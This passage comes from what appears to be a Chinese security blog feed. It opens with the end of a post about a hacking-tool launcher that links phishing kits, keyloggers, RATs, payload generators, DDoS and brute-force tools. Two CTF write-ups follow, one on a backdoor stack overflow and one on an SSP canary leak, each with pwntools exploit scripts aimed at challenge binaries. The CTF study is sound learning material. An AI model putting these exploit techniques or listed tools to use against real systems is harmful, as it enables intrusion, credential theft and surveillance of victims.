href="#Phishing-attack-tools（钓鱼攻击模块）" class="headerlink" title="Phishing attack tools（钓鱼攻击模块）"></a>Phishing attack tools（钓鱼攻击模块）</h3><ul><li><a href="https://github.com/trustedsec/social-engineer-toolkit">Setoolkit</a></li><li><a href="https://github.com/UndeadSec/SocialFish">SocialFish</a></li><li><a href="https://github.com/DarkSecDevelopers/HiddenEye">HiddenEye</a></li><li><a href="https://github.com/kgretzky/evilginx2">Evilginx2</a></li><li><a href="https://github.com/Viralmaniar/I-See-You">I-See_You(Get Location using phishing attack)</a></li><li><a href="https://github.com/hangetzzu/saycheese">SayCheese (Grab target’s Webcam Shots)</a></li><li><a href="https://github.com/cryptedwolf/ohmyqr">QR Code Jacking</a></li><li><a href="https://github.com/An0nUD4Y/shellphish">ShellPhish</a></li><li><a href="https://github.com/iinc0gnit0/BlackPhish">BlackPhish</a></li></ul><h3 id="Web-Attack-tools（网站攻击模块）"><a href="#Web-Attack-tools（网站攻击模块）" class="headerlink" title="Web Attack tools（网站攻击模块）"></a>Web Attack tools（网站攻击模块）</h3><ul><li><a href="https://github.com/santatic/web2attack">Web2Attack</a></li><li>Skipfish</li><li><a href="https://github.com/aboul3la/Sublist3r">SubDomain Finder</a></li><li><a href="https://github.com/UndeadSec/checkURL">CheckURL</a></li><li><a href="https://github.com/UltimateHackers/Blazy">Blazy(Also Find ClickJacking)</a></li><li><a href="https://github.com/m4ll0k/takeover">Sub-Domain TakeOver</a></li><li><a href="https://gitlab.com/kalilinux/packages/dirb">Dirb</a></li><li><a href="https://github.com/yanxiu0614/subdomain3">Subdomain3</a></li><li><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F</a></li><li><a href="https://github.com/3xp10it/xwaf">XWAF</a></li><li><a href="https://github.com/ekultek/whatwaf">WhatWaf</a></li></ul><h3 id="Post-exploitation-tools（投毒模块）"><a href="#Post-exploitation-tools（投毒模块）" class="headerlink" title="Post exploitation tools（投毒模块）"></a>Post exploitation tools（投毒模块）</h3><ul><li><a href="https://github.com/Screetsec/Vegile">Vegile - Ghost In The Shell</a></li><li><a href="https://github.com/UndeadSec/HeraKeylogger">Chrome Keylogger</a></li></ul><h3 id="Forensic-tools（取证工具模块）"><a href="#Forensic-tools（取证工具模块）" class="headerlink" title="Forensic tools（取证工具模块）"></a>Forensic tools（取证工具模块）</h3><ul><li>Autopsy</li><li>Wireshark</li><li><a href="https://github.com/simsong/bulk_extractor">Bulk extractor</a></li><li><a href="https://guymager.sourceforge.io/">Disk Clone and ISO Image Aquire</a></li><li><a href="https://www.toolsley.com/">Toolsley</a></li></ul><h3 id="Payload-creation-tools（Payload生成模块）"><a href="#Payload-creation-tools（Payload生成模块）" class="headerlink" title="Payload creation tools（Payload生成模块）"></a>Payload creation tools（Payload生成模块）</h3><ul><li><a href="https://github.com/Screetsec/TheFatRat">The FatRat</a></li><li><a href="https://github.com/Screetsec/Brutal">Brutal</a></li><li><a href="https://nathanlopez.github.io/Stitch">Stitch</a></li><li><a href="https://github.com/g0tmi1k/msfpc">MSFvenom Payload Creator</a></li><li><a href="https://github.com/r00t-3xp10it/venom">Venom Shellcode Generator</a></li><li><a href="https://github.com/thelinuxchoice/spycam">Spycam</a></li><li><a href="https://github.com/kinghacker0/Mob-Droid">Mob-Droid</a></li><li><a href="https://github.com/UndeadSec/Enigma">Enigma</a></li></ul><h3 id="Exploit-framework（渗透框架模块）"><a href="#Exploit-framework（渗透框架模块）" class="headerlink" title="Exploit framework（渗透框架模块）"></a>Exploit framework（渗透框架模块）</h3><ul><li><a href="https://github.com/threat9/routersploit">RouterSploit</a></li><li><a href="https://github.com/The404Hacking/websploit">WebSploit</a></li><li><a href="https://github.com/commixproject/commix">Commix</a></li><li><a href="https://github.com/santatic/web2attack">Web2Attack</a></li><li><a href="https://github.com/zdresearch/OWASP-Nettacker">OWASP-Nettacker</a></li><li><a href="https://github.com/torque59/Nosql-Exploitation-Framework">NoSQL Exploitation Framework</a></li></ul><h3 id="Reverse-engineering-tools（逆向工程模块）"><a href="#Reverse-engineering-tools（逆向工程模块）" class="headerlink" title="Reverse engineering tools（逆向工程模块）"></a>Reverse engineering tools（逆向工程模块）</h3><ul><li><a href="https://github.com/androguard/androguard">Androguard</a></li><li><a href="https://github.com/lxdvs/apk2gold">Apk2Gold</a></li><li><a href="https://github.com/skylot/jadx">JadX</a></li></ul><h3 id="DDOS-Attack-Tools（DDOS攻击模块）"><a href="#DDOS-Attack-Tools（DDOS攻击模块）" class="headerlink" title="DDOS Attack Tools（DDOS攻击模块）"></a>DDOS Attack Tools（DDOS攻击模块）</h3><ul><li>SlowLoris</li><li><a href="https://github.com/fatihsnsy/aSYNcrone">Asyncrone | Multifunction SYN Flood DDoS Weapon</a></li><li><a href="https://github.com/epsylon/ufonet">UFOnet</a></li><li><a href="https://github.com/jseidl/GoldenEye">GoldenEye</a></li></ul><h3 id="Remote-Administrator-Tools-RAT模块"><a href="#Remote-Administrator-Tools-RAT模块" class="headerlink" title="Remote Administrator Tools (RAT模块)"></a>Remote Administrator Tools (RAT模块)</h3><ul><li><a href="https://github.com/nathanlopez/Stitch">Stitch</a></li><li><a href="https://github.com/knassar702/pyshell">Pyshell</a></li></ul><h3 id="XSS-Attack-Tools（XSS攻击模块）"><a href="#XSS-Attack-Tools（XSS攻击模块）" class="headerlink" title="XSS Attack Tools（XSS攻击模块）"></a>XSS Attack Tools（XSS攻击模块）</h3><ul><li><a href="https://github.com/hahwul/dalfox">DalFox(Finder of XSS)</a></li><li><a href="https://github.com/capture0x/XSS-LOADER">XSS Payload Generator</a></li><li><a href="https://github.com/Damian89/extended-xss-search">Extended XSS Searcher and Finder</a></li><li><a href="https://github.com/PR0PH3CY33/XSS-Freak">XSS-Freak</a></li><li><a href="https://github.com/hahwul/XSpear">XSpear</a></li><li><a href="https://github.com/menkrep1337/XSSCon">XSSCon</a></li><li><a href="https://github.com/Ekultek/XanXSS">XanXSS</a></li><li><a href="https://github.com/UltimateHackers/XSStrike">Advanced XSS Detection Suite</a></li><li><a href="https://github.com/iinc0gnit0/RVuln">RVuln</a></li></ul><h3 id="Steganograhy-tools（隐写模块）"><a href="#Steganograhy-tools（隐写模块）" class="headerlink" title="Steganograhy tools（隐写模块）"></a>Steganograhy tools（隐写模块）</h3><ul><li>SteganoHide</li><li>StegnoCracker</li><li><a href="https://github.com/beardog108/snow10">Whitespace</a></li></ul><h3 id="Vulnerablities-Scanner（漏洞扫描利用模块）"><a href="#Vulnerablities-Scanner（漏洞扫描利用模块）" class="headerlink" title="Vulnerablities Scanner（漏洞扫描利用模块）"></a>Vulnerablities Scanner（漏洞扫描利用模块）</h3><ul><li><a href="https://github.com/lijiejie/BBScan">BBScan</a></li><li><a href="https://github.com/w-digital-scanner/w9scan">w9scan</a></li></ul><h3 id="IOT-Tools（物联网模块）"><a href="#IOT-Tools（物联网模块）" class="headerlink" title="IOT Tools（物联网模块）"></a>IOT Tools（物联网模块）</h3><ul><li><a href="https://github.com/threat9/routersploit">RouterSploit</a></li><li><a href="https://github.com/RUB-NDS/PRET">PRET</a></li></ul><h3 id="Other-tools（其他工具）"><a href="#Other-tools（其他工具）" class="headerlink" title="Other tools（其他工具）"></a>Other tools（其他工具）</h3><h4 id="SocialMedia-Bruteforce（社工模块）"><a href="#SocialMedia-Bruteforce（社工模块）" class="headerlink" title="SocialMedia Bruteforce（社工模块）"></a>SocialMedia Bruteforce（社工模块）</h4><ul><li><a href="https://github.com/chinoogawa/instaBrute">Instagram Attack</a></li><li><a href="https://github.com/Matrix07ksa/Brute_Force">AllinOne SocialMedia Attack</a></li><li><a href="https://github.com/Matrix07ksa/Brute_Force">Facebook Attack</a></li><li><a href="https://github.com/jakuta-tech/underhanded">Application Checker</a></li></ul><h4 id="Android-Hacking-tools（安卓模块）"><a href="#Android-Hacking-tools（安卓模块）" class="headerlink" title="Android Hacking tools（安卓模块）"></a>Android Hacking tools（安卓模块）</h4><ul><li><a href="https://github.com/F4dl0/keydroid">Keydroid</a></li><li><a href="https://github.com/papusingh2sms/mysms">MySMS</a></li><li><a href="https://github.com/JasonJerry/lockphish">Lockphish (Grab target LOCK PIN)</a></li><li><a href="https://github.com/kinghacker0/WishFish">DroidCam (Capture Image)</a></li><li><a href="https://github.com/crypticterminal/EvilApp">EvilApp (Hijack Session)</a></li><li><a href="https://github.com/HatBashBR/HatCloud">HatCloud(Bypass CloudFlare for IP)</a></li></ul><h4 id="IDN-Homograph-Attack（恶意域名模块）"><a href="#IDN-Homograph-Attack（恶意域名模块）" class="headerlink" title="IDN Homograph Attack（恶意域名模块）"></a>IDN Homograph Attack（恶意域名模块）</h4><ul><li><a href="https://github.com/UndeadSec/EvilURL">EvilURL</a></li></ul><h4 id="Email-Verify-tools（邮箱攻击模块）"><a href="#Email-Verify-tools（邮箱攻击模块）" class="headerlink" title="Email Verify tools（邮箱攻击模块）"></a>Email Verify tools（邮箱攻击模块）</h4><ul><li><a href="https://github.com/4w4k3/KnockMail">Knockmail</a></li></ul><h4 id="Hash-cracking-tools（Hash破解模块）"><a href="#Hash-cracking-tools（Hash破解模块）" class="headerlink" title="Hash cracking tools（Hash破解模块）"></a>Hash cracking tools（Hash破解模块）</h4><ul><li><a href="https://github.com/s0md3v/Hash-Buster">Hash Buster</a></li></ul><h4 id="Wifi-Deauthenticate（Wifi认证模块）"><a href="#Wifi-Deauthenticate（Wifi认证模块）" class="headerlink" title="Wifi Deauthenticate（Wifi认证模块）"></a>Wifi Deauthenticate（Wifi认证模块）</h4><ul><li><a href="https://github.com/MisterBianco/wifijammer-ng">WifiJammer-NG</a></li><li><a href="https://github.com/aryanrtm/KawaiiDeauther">KawaiiDeauther</a></li></ul><h4 id="SocialMedia-Finder（社交工具泄密模块）"><a href="#SocialMedia-Finder（社交工具泄密模块）" class="headerlink" title="SocialMedia Finder（社交工具泄密模块）"></a>SocialMedia Finder（社交工具泄密模块）</h4><ul><li><a href="https://github.com/Greenwolf/social_mapper">Find SocialMedia By Facial Recognation System</a></li><li><a href="https://github.com/xHak9x/finduser">Find SocialMedia By UserName</a></li><li><a href="https://github.com/sherlock-project/sherlock">Sherlock</a></li><li><a href="https://github.com/iojw/socialscan">SocialScan | Username or Email</a></li></ul><h4 id="Payload-Injector（Payload注入模块）"><a href="#Payload-Injector（Payload注入模块）" class="headerlink" title="Payload Injector（Payload注入模块）"></a>Payload Injector（Payload注入模块）</h4><ul><li><a href="https://github.com/UndeadSec/Debinject">Debinject</a></li><li><a href="https://github.com/chinarulezzz/pixload">Pixload</a></li></ul><h4 id="Web-crawling（网站爬虫模块）"><a href="#Web-crawling（网站爬虫模块）" class="headerlink" title="Web crawling（网站爬虫模块）"></a>Web crawling（网站爬虫模块）</h4><ul><li><a href="https://github.com/jaeles-project/gospider">Gospider</a></li></ul><h4 id="Mix-tools（混合工具模块）"><a href="#Mix-tools（混合工具模块）" class="headerlink" title="Mix tools（混合工具模块）"></a>Mix tools（混合工具模块）</h4><ul><li>Terminal Multiplexer</li></ul><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>⚠️⚠️⚠️ 注意：必须以root权限运行 HackINonE ！！！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Coldwave96/HackINonE.git</span><br><span class="line">sudo <span class="built_in">chmod</span> -R 755 HackINonE</span><br><span class="line"><span class="built_in">cd</span> HackINonE</span><br><span class="line">sudo pip3 install -r requirement.txt</span><br><span class="line">./install.sh</span><br><span class="line">sudo HackINonE</span><br></pre></td></tr></table></figure><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p>🙏🙏🙏 感谢收录的所有工具的作者们 💐👏🎁</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Program </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ - Backdoor の Write-Up</title>
      <link href="/2020/08/18/Backdoor/"/>
      <url>/2020/08/18/Backdoor/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>根据题目程序存在后门，某个参数可以触发该程序执行后门操作。这个程序是个exe程序，但在win10和win7虚拟机上均无法运行，最后在Win XP上按照提示下载了缺失的MSVCP100D.dll后终于得以成功运行。</p><span id="more"></span><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>一开始在hopper中反编译程序，虽然程序逻辑结构很清楚，但是代码可读性真是一言难尽……还是老老实实打开IDA吧。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">signed <span class="built_in">int</span> __<span class="function">cdecl <span class="title">wmain</span>(<span class="params"><span class="built_in">int</span> a1, <span class="built_in">int</span> a2</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">char</span> v3; <span class="comment">// [esp+50h] [ebp-2C8h]</span></span><br><span class="line">  <span class="built_in">char</span> v4; <span class="comment">// [esp+E1h] [ebp-237h]</span></span><br><span class="line">  <span class="built_in">char</span> v5; <span class="comment">// [esp+E4h] [ebp-234h]</span></span><br><span class="line">  <span class="built_in">char</span> Source[<span class="number">4</span>]; <span class="comment">// [esp+100h] [ebp-218h]</span></span><br><span class="line">  <span class="built_in">char</span> v7; <span class="comment">// [esp+104h] [ebp-214h]</span></span><br><span class="line">  __int16 i; <span class="comment">// [esp+108h] [ebp-210h]</span></span><br><span class="line">  <span class="built_in">char</span> Dest[<span class="number">2</span>]; <span class="comment">// [esp+10Ch] [ebp-20Ch]</span></span><br><span class="line">  <span class="built_in">char</span> Dst; <span class="comment">// [esp+10Eh] [ebp-20Ah]</span></span><br><span class="line">  <span class="built_in">char</span> v11[<span class="number">25</span>]; <span class="comment">// [esp+110h] [ebp-208h]</span></span><br><span class="line">  <span class="built_in">char</span> v12[<span class="number">483</span>]; <span class="comment">// [esp+129h] [ebp-1EFh]</span></span><br><span class="line">  __int16 v13; <span class="comment">// [esp+30Ch] [ebp-Ch]</span></span><br><span class="line">  LPSTR lpMultiByteStr; <span class="comment">// [esp+310h] [ebp-8h]</span></span><br><span class="line">  <span class="built_in">int</span> cbMultiByte; <span class="comment">// [esp+314h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  cbMultiByte = WideCharToMultiByte(<span class="number">1u</span>, <span class="number">0</span>, *(LPCWSTR *)(a2 + <span class="number">4</span>), <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  lpMultiByteStr = (LPSTR)sub_4011F0(cbMultiByte);</span><br><span class="line">  WideCharToMultiByte(<span class="number">1u</span>, <span class="number">0</span>, *(LPCWSTR *)(a2 + <span class="number">4</span>), <span class="number">-1</span>, lpMultiByteStr, cbMultiByte, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v13 = *(_WORD *)lpMultiByteStr;</span><br><span class="line">  <span class="keyword">if</span> ( v13 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v13 ^= <span class="number">0x6443</span>u;</span><br><span class="line">  strcpy(Dest, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">  memset(&amp;Dst, <span class="number">0</span>, <span class="number">0x1FE</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v13; ++i )</span><br><span class="line">    Dest[i] = <span class="number">65</span>;</span><br><span class="line">  *(_DWORD *)Source = <span class="number">2147108114</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  strcpy(&amp;Dest[v13], Source);</span><br><span class="line">  qmemcpy(&amp;v5, &amp;unk_4021FC, <span class="number">0x1A</span>u);</span><br><span class="line">  strcpy(&amp;v11[v13], &amp;v5);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_402168, <span class="number">0x91</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  strcpy(&amp;v12[v13], &amp;v3);</span><br><span class="line">  sub_401000(Dest);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看下这个主函数。应该是接收键盘输入的内容，经过转换然后赋给v13，注意v13申明的是int 16，再将v13与0x6443异或。然后向Dest数组里填充v13数值个的ASCII值65也就是’A’。</p><p>再将2147108114即0x7ffa4512这个地址传到了Dest[v13]。而0x7ffa4512这个地址在windows上是一个万能的jmp esp（几乎所有的平台上这个地址都是jmp esp）。所以可以通过这个地址上的jmp esp指令控制程序跳转到某一个函数的地址上去执行设定好的函数。</p><p>再往下走，这个函数最后调用Dest是将其作为sub_401000函数的参数，再去找一下这个函数：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __<span class="function">cdecl <span class="title">sub_401000</span>(<span class="params"><span class="built_in">char</span> *Source</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">char</span> Dest[<span class="number">2</span>]; <span class="comment">// [esp+4Ch] [ebp-20h]</span></span><br><span class="line">  <span class="built_in">int</span> v3; <span class="comment">// [esp+4Eh] [ebp-1Eh]</span></span><br><span class="line">  <span class="built_in">int</span> v4; <span class="comment">// [esp+52h] [ebp-1Ah]</span></span><br><span class="line">  <span class="built_in">int</span> v5; <span class="comment">// [esp+56h] [ebp-16h]</span></span><br><span class="line">  <span class="built_in">int</span> v6; <span class="comment">// [esp+5Ah] [ebp-12h]</span></span><br><span class="line">  <span class="built_in">int</span> v7; <span class="comment">// [esp+5Eh] [ebp-Eh]</span></span><br><span class="line">  <span class="built_in">int</span> v8; <span class="comment">// [esp+62h] [ebp-Ah]</span></span><br><span class="line">  <span class="built_in">int</span> v9; <span class="comment">// [esp+66h] [ebp-6h]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [esp+6Ah] [ebp-2h]</span></span><br><span class="line"></span><br><span class="line">  strcpy(Dest, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  strcpy(Dest, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然在这个函数里发现了溢出漏洞，在strcpy(Dest, Source)语句这里。在主函数中Source申明的是char Source[4]，而Dest申明的是char Dest[2]，strcpy函数把一个长字符赋给里一个短字符，典型的溢出漏洞。</p><p>根据Dest的大小，需要0x20的padding加上4个字节的返回地址，一共0x24字节。这样程序执行的时候会将0x7ffa4512覆盖到Dest最后4字节也就是strcpy函数的返回地址，从而控制程序跳转触发后门。</p><p>所以我们需要控制的是v13的值为0x24即可，再注意一下机器的大小端问题以及题目要求的给出参数小写SHA256值，直接给出EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">value = <span class="built_in">chr</span>(<span class="number">0x24</span> ^ <span class="number">0x43</span>)</span><br><span class="line">value += <span class="built_in">chr</span>(<span class="number">0</span> ^ <span class="number">0x64</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;value: &quot;</span> + value</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;flag: PCTF&#123;&quot;</span> + hashlib.sha256(value).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>执行之后就可以得到出发后门的参数以及flag：</p><p><img src="/img/Backdoor/Backdoor1.png"></p><p>后门程序在Win XP中复现成功，弹出了计算器：</p><p><img src="/img/Backdoor/Backdoor2.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ - Smashes の Write-Up</title>
      <link href="/2020/08/06/Smashes/"/>
      <url>/2020/08/06/Smashes/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Smashes这道题算是一类题型的典型代表，第一次和Canary交手，还好题目比较简单。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先运行程序：</p><p><img src="/img/Smashes/Smashes1.png"></p><p>检查一下保护措施：</p><p><img src="/img/Smashes/Smashes2.png"></p><p>可以看到保护措施还是比较完备的，开启了DEP、Canary和FORTIFY保护。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>将程序丢到hopper中，发现了一个关键的主函数：</p><p><img src="/img/Smashes/Smashes3.png"></p><p>  可以看到输入name的时候总体的stack大小为296也就是0x128，但是在rbx会放置Canary，大小为0x20。也就是说当我们输入的字符超过0x108就会覆盖Canary值，然后程序就会报错。如下图所示：</p><p><img src="/img/Smashes/Smashes4.png"></p><p> 而在“Please overwrite the flag: ”后的输入，程序通过_IO_getc(*stdin)接收。但是没有设置范围，只有当遇到‘\n’的时候才会退出循环，继续往下运行。</p><p>程序存在Canary保护，所以常规的栈溢出无法实现。经过大佬提点，可以通过故意触发Canary来实现SSP（Stack Smashing Protector）Leak。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>首先还是要了解一下Stack Smash。当程序有了Canary保护之后，如果我们尝试缓冲区溢出，那么输入的数据会首先覆盖EBP上面的Canary值。而程序运行的时候会将这个值与原来的Canary值做比较，发现不一样就会报错。通常来说不太会注意报错信息，但是Stack Smash方法就是利用打印的报错信息的程序来得到我们想要的内容。看下程序中检查Canary的部分：</p><p><img src="/img/Smashes/Smashes5.png"></p><p>rax中存放的是程序运行时Canary的值，比较不通过时会调用__stack_chk_fail()函数打印报错信息。找一下__stack_chk_fail()函数的源码：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;   </span><br><span class="line">    __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再继续看下__fortify_fail()函数：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="keyword">const</span> <span class="built_in">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure><p>__stack_chk_fail()函数中调用了__fortify_fail()函数，而在__fortify_fail()函数中调用__libc_message()函数输出了msg和__libc_argv[0]。msg就是”stack smashing detected”，__libc_argv[0]其实是argv[0]，也就是程序名。</p><p>在程序执行的时候，argv[0]会放在栈中，利用栈溢出可以将这个值覆盖为我们想要的值。比如某个函数的got表中的值，这样在执行__stack_chk_fail()函数的时候。利用输出报错信息就可以输出想要的got表信息，再加上libc文件偏移就可以获得libc加载的基地址。之后就可以通过基地址进一步利用，获得栈地址及栈中的重要信息。</p><p> 扯远了，这道题里我们想的肯定的直接覆盖为flag的地址，首先来了解一下这个程序里栈的布局：</p><p><img src="/img/Smashes/Smashes6.png"></p><p>所以这里有种简单的方法，只要我们能够输入足够长的字符串覆盖掉argv[0]，就可以在触发Canary保护的同时输出flag。</p><p>最后一个问题，flag地址在哪里。在hopper中我们分明看到了两个flag地址loc_40084e和loc_400860（在IDA中居然只有一个，以往hopper的伪代码可读性令人头大，这次居然意料之外的压制了IDA），loc_40084e中指向byte [rbx+aPctfheresTheFl]，而loc_400860就指向aPctfheresTheFl：</p><p><img src="/img/Smashes/Smashes7.png"></p><p>但是我们用0x600d20这个地址无法获得flag，这里会被覆盖，所以需要利用byte [rbx+aPctfheresTheFl]位置的flag地址。把程序断在loc_400860函数，然后在程序中寻找‘PCTF’的字样：</p><p><img src="/img/Smashes/Smashes8.png"></p><p>我们再看一下0x600d20位置的flag：</p><p><img src="/img/Smashes/Smashes9.png"></p><p>对照上面我们的输入：</p><p><img src="/img/Smashes/Smashes10.png"></p><p>发现这个位置的flag会被我们的输入所覆盖，所以选择0x400d20位置的flag。</p><p>于是给出EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>, <span class="number">9877</span>)</span><br><span class="line">  </span><br><span class="line">flag_addr = <span class="number">0x400d20</span></span><br><span class="line">payload = p64(flag_addr) * <span class="number">200</span></span><br><span class="line">  </span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>EXP脚本运行结果图：</p><p><img src="/img/Smashes/Smashes11.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>虽然解决了问题，但是觉得这样很是不爽。于是继续找一下具体的offset值。</p><p>把程序断在主函数sub_4007e0，可以看到程序名字也就是argv[0]已经到了栈中：</p><p><img src="/img/Smashes/Smashes12.png"></p><p>然后再在程序输入名字的位置下个断点：</p><p><img src="/img/Smashes/Smashes13.png"></p><p>可以看到调用__IO_gets接收输入，接收完之后将程序断下来：</p><p><img src="/img/Smashes/Smashes14.png"></p><p> 所以输入地址与argv[0]的距离为：0x7ffd531186d8 - 0x7ffd531184c0 &#x3D; 0x218，也就是需要padding的部分。</p><p>最终第二种方法的EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>, <span class="number">9877</span>)</span><br><span class="line">  </span><br><span class="line">flag_addr = <span class="number">0x400d20</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x218</span> + p64(flag_addr)</span><br><span class="line">  </span><br><span 